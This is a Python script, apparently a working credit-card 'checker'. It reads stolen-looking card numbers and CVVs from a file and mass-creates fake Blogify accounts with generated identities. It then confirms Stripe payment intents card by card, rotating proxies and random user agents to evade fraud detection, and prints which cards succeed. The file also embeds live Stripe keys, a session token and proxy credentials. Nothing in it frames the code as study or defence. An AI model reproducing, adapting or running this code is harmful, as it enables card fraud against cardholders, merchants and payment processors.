import requests
import fake_useragent
import random
import string
import names
import time
import secrets
import json
import os
from itertools import cycle

pay = "0"

class ProxyRotator:
    def __init__(self, proxy_file):
        with open(proxy_file, 'r') as f:
            self.proxy_list = [line.strip() for line in f.readlines()]
        random.shuffle(self.proxy_list)
        self.proxy_cycle = cycle(self.proxy_list)
        self.working_proxies = set()
        self.failed_proxies = set()

    def is_proxy_live(self, proxy):
        try:
            response = requests.get('http://httpbin.org/ip', proxies=proxy, timeout=5)
            return response.status_code == 200
        except:
            return False

    def parse_proxy(self, proxy):
        parts = proxy.split('@')
        if len(parts) == 2:
            ip_port, auth = parts
            username, password = auth.split(':')
            return {
                'http': f'http://{username}:{password}@{ip_port}',
                'https': f'http://{username}:{password}@{ip_port}'
            }
        else:
            return {
                'http': 'http://' + proxy,
                'https': 'http://' + proxy
            }

    def get_proxy(self):
        for _ in range(len(self.proxy_list)):
            proxy = next(self.proxy_cycle)
            if proxy in self.working_proxies:
                return self.parse_proxy(proxy)
            if proxy not in self.failed_proxies:
                proxy_dict = self.parse_proxy(proxy)
                if self.is_proxy_live(proxy_dict):
                    self.working_proxies.add(proxy)
                    return proxy_dict
                else:
                    self.failed_proxies.add(proxy)
        if self.working_proxies:
            return self.parse_proxy(random.choice(list(self.working_proxies)))
        else:
            raise Exception("No live proxy found")

    def remove_proxy(self, proxy):
        proxy_str = f"{proxy['http'].split('://')[-1]}"
        if proxy_str in self.working_proxies:
            self.working_proxies.remove(proxy_str)
        self.failed_proxies.add(proxy_str)

proxy_rotator = ProxyRotator('proxies.txt')

def peck():
    proxies = proxy_rotator.get_proxy()
    try:
        resp = requests.get("https://api.ipify.org", proxies=proxies)
        if resp.status_code == 200:
            print("IP Address:", resp.text.strip())
        else:
            print(f"Proxy Dead: {resp.status_code}")
            sys.exit()
    except requests.RequestException as e:
        print(f"Proxy is not alive. Error: {e}")

def read_credit_card_info_from_file(filename):
    with open(filename, 'r') as file:
        credit_card_data = file.read()
    return separate_credit_card_info(credit_card_data)

def separate_credit_card_info(input_string):
    lines = input_string.splitlines()
    cards = []
    for line in lines:
        parts = line.split('|')
        number = parts[0]
        month = parts[1]
        year = parts[2][-2:] if len(parts[2]) > 2 else parts[2]
        cvv = parts[3]
        cards.append({"number": number, "month": month, "year": year, "cvv": cvv})
    return cards

def create_user_info():
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    email_providers = [
        "gmail.com", "yahoo.com", "outlook.com", "hotmail.com",
        "icloud.com", "protonmail.com", "aol.com", "mail.com"
    ]
    email_domain = random.choice(email_providers)
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@{email_domain}"
    password_length = random.randint(10, 16)
    password_characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(password_characters) for i in range(password_length))
    business_types = ["Solutions", "Technologies", "Innovations", "Enterprises", "Services", "Industries", "Systems"]
    business_adjectives = ["Global", "Advanced", "Innovative", "Dynamic", "Strategic", "Precision", "Quantum"]
    business_name = f"{random.choice(business_adjectives)} {last_name} {random.choice(business_types)}"
    return {
        "first_name": first_name,
        "last_name": last_name,
        "email": email,
        "password": password,
        "business_name": business_name
    }

def muid(ua, proxies):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept": "/"
    }
    response = requests.post("https://m.stripe.com/6", headers=headers, proxies=proxies)
    json_data = response.json()
    m = json_data.get("muid")
    s = json_data.get("sid")
    g = json_data.get("guid")
    return m, s, g

def jwt():
    user_info = create_user_info()
    url = "https://api.blogify.ai/auth/signup"
    headers = {
        "POST": "/auth/signup HTTP/2",
        "Host": "api.blogify.ai",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://blogify.ai",
        "Content-Length": "141",
        "Origin": "https://blogify.ai",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "no-cors",
        "Sec-Fetch-Site": "same-site",
        "TE": "trailers",
        "Content-Type": "application/json",
        "Priority": "u=4",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    data = {
        "name": f"{user_info['first_name']} {user_info['last_name']}",
        "email": user_info['email'],
        "password": user_info['password'],
        "businessName": user_info['business_name'],
        "foundUsFrom": "Google"
    }
    response = requests.post(url, headers=headers, json=data)
    data["token"] = response.json()["access_token"]
    return data

def key(file_path="key.txt", data_function=jwt, mode='read'):
    if mode == 'read':
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r') as file:
                    data = json.load(file)
                    return data
            except (json.JSONDecodeError, FileNotFoundError):
                if data_function:
                    data = data_function()
                    with open(file_path, 'w') as file:
                        json.dump(data, file)
                    return data
                else:
                    return "Error decoding JSON from file and no data function provided to write."
        else:
            if data_function:
                data = data_function()
                with open(file_path, 'w') as file:
                    json.dump(data, file)
                return data
            else:
                return "File not found and no data function provided to write."
    elif mode == 'delete':
        if os.path.exists(file_path):
            with open(file_path, 'w') as file:
                file.write('')
            return "File content deleted."
        else:
            return "File not found."
    else:
        return "Invalid mode."

def login_and_get_token():
    with open("key.txt", "r") as file:
        key_data = json.load(file)
    email = key_data["email"]
    password = key_data["password"]
    url = "https://api.blogify.ai/auth/login"
    headers = {
        "POST": "/auth/login HTTP/2",
        "Host": "api.blogify.ai",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://blogify.ai",
        "Content-Length": "141",
        "Origin": "https://blogify.ai",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "no-cors",
        "Sec-Fetch-Site": "same-site",
        "TE": "trailers",
        "Content-Type": "application/json",
        "Priority": "u=4",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"
    }
    data = {
        "email": email,
        "password": password
    }
    response = requests.post(url, headers=headers, json=data)
    access_token = response.json()["access_token"]
    key_data["token"] = access_token
    with open("key.txt", "w") as file:
        json.dump(key_data, file)
    return access_token

def blogify():
    auth = key()
    url = "https://api.blogify.ai/payments/create-subscription?is-upgrade=true"
    headers = {
        "POST": "/payments/create-subscription",
        "Host": "api.blogify.ai",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://blogify.ai/",
        "Authorization": f"Bearer {auth['token']}",
        "Content-Type": "application/json",
        "Content-Length": "57",
        "Origin": "https://blogify.ai",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=1",
        "TE": "trailers"
    }
    data = {
        "price_id": "price_1N71dZFhM9bD4yCuAwPAUtPP",
        "coupon": ""
    }
    response = requests.post(url, headers=headers, json=data)
    if "clientSecret" not in response.json():
        access_token = login_and_get_token()
        headers["Authorization"] = f"Bearer {access_token}"
        response = requests.post(url, headers=headers, json=data)
    dd = response.json()["clientSecret"]
    index = dd.find('_secret_')
    aa = dd[:index]
    return aa, dd, auth["token"]
    

def send_stripe_token_request(number, month, year, cvv, pk, secretpi, ua):
    global pay
    proxies = proxy_rotator.get_proxy()
    start_time = time.time()
    url = f"https://api.stripe.com/v1/payment_intents/{secretpi[0]}/confirm"
    headers = {
        "POST": f"/v1/payment_intents/{secretpi[0]}/confirm",
        "HTTP/2": "",
        "Host": "api.stripe.com",
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://js.stripe.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "4302",
        "Origin": "https://js.stripe.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=4TE: trailers"
    }
    data = {
        #"return_url": "https://api.blogify.ai/payments/confirm-purchase-subscription?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2NjgxYTU4YzU4NzgyZDgxY2ZiODRhZmIiLCJlbWFpbCI6IndlYi5oZWFkbGFtcDI4MEBwYXNzaW5ib3guY29tIiwibmFtZSI6Ik1yLiBHZXJhcmQgSGVpZGVucmVpY2giLCJiaWQiOiI2NjgxYTU4YzU4NzgyZDgxY2ZiODRhZmMiLCJibmFtZSI6IndhIiwiaWF0IjoxNzE5NzcyNTU3LCJleHAiOjE3MTk4NTg5NTd9.TZMRnINZCFGQ7KpOmMRiKDDwGv4pKg47Gtnv3wkMmN0&plan=MONTHLY_LITE&coupon=",
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": number,
        "payment_method_data[card][cvc]": cvv,
        "payment_method_data[card][exp_year]": year,
        "payment_method_data[card][exp_month]": month,
        "payment_method_data[allow_redisplay]": "unspecified",
        "payment_method_data[billing_details][address][country]": "US",
        "payment_method_data[pasted_fields]": "number",
        #"payment_method_data[payment_user_agent]": "stripe.js/97cb06c5c7; stripe-js-v3/97cb06c5c7; payment-element; deferred-intent; autopm",
        "payment_method_data[referrer]": "https://blogify.ai",
        "payment_method_data[time_on_page]": str(int(time.time() - start_time)),
        #"payment_method_data[client_attribution_metadata][client_session_id]": "12472b75-53a6-468c-9d4f-5716c25baddf",
        #"payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
        #"payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
        #"payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
        #"payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
        #"payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
        "payment_method_data[guid]": "NA",
        "payment_method_data[muid]": "NA",
        "payment_method_data[sid]": "NA",
        #"expected_payment_method_type": "card",
        #"client_context[currency]": "usd",
        #"client_context[mode]": "subscription",
        #"client_context[setup_future_usage]": "off_session",
        "use_stripe_sdk": "true",
        "key": "pk_live_51MGlDXFhM9bD4yCujVgeWBRm8qzbEShjgQiW2vLJUogBMoXOF1ORLHFRBilFdL12klkk2DC5rSTUmEPW3wSUyrL700dh5FZCOh",
        "client_secret": secretpi[1]
    }

    response = requests.post(url, headers=headers, data=data, proxies=proxies)
    
    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    
    
    if '"status": "succeeded"' in response.text:
        pay = "1"
        key(mode='delete')
        print(response.text)
        return stripe_payment_intent_confirm(response_json["payment_method"], proxies, number, month, year, cvv, ua, secretpi)
        #secretpi.close()
        print(response.text)
        #return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv} | {generate_random_email()[1]} | {generate_random_email()[0]} | {ua}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful| {secretpi[1]}"
    elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
        return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD"
    else:
        return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}"
 
 
def stripe_payment_intent_confirm(pm, proxies, number, month, year, cvv, ua, secretpi):
    url = f"https://api.stripe.com/v1/payment_intents/{secretpi[0]}/confirm"

    headers = {
        "POST": f"/v1/payment_intents/{secretpi[0]}/confirm HTTP/2",
        "Host": "api.stripe.com",
        "User-Agent": ua,
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Referer": "https://js.stripe.com",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "239",
        "Origin": "https://js.stripe.com",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=4TE: trailers"
    }

    data = {
        "setup_future_usage": "off_session",
        "payment_method": pm,
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_51MGlDXFhM9bD4yCujVgeWBRm8qzbEShjgQiW2vLJUogBMoXOF1ORLHFRBilFdL12klkk2DC5rSTUmEPW3wSUyrL700dh5FZCOh",
        "client_secret": secretpi[1]
    }

    response = requests.post(url, headers=headers, data=data, proxies=proxies)
    
    
    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    
    
    if '"status": "succeeded"' in response.text:
        #print(1)
        #print(secretpi)
        #print(response.text)
        return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv} | {ua}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful| {secretpi[1]}"
    elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
        return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD"
    else:
        return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {number}|{month}|{year}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}"



cards = read_credit_card_info_from_file('cc.txt')

pk = "pk_live_iHIxB7OJrLLocOUih5WWEfc3"


for loop_count, card in enumerate(cards, 1):
    if loop_count % 9 == 0 or loop_count == 1:
         #response = requests.post(url, headers=headers, json=data)
         secretpi = blogify()
    elif pay == "1":
          secretpi = blogify()
          pay = "1"     
     
    #combined_proxy = "http://purevpn0s3978104:hk6vchvcmyah@prox-in.pointtoserver.com:10799"
    #r.proxies = {"http": combined_proxy, "https": combined_proxy}
    r = requests.session()    
    peck()
    random_ua = fake_useragent.UserAgent().random
    result = send_stripe_token_request(card['number'], card['month'], card['year'], card['cvv'], pk, secretpi, random_ua)
    print(result)               
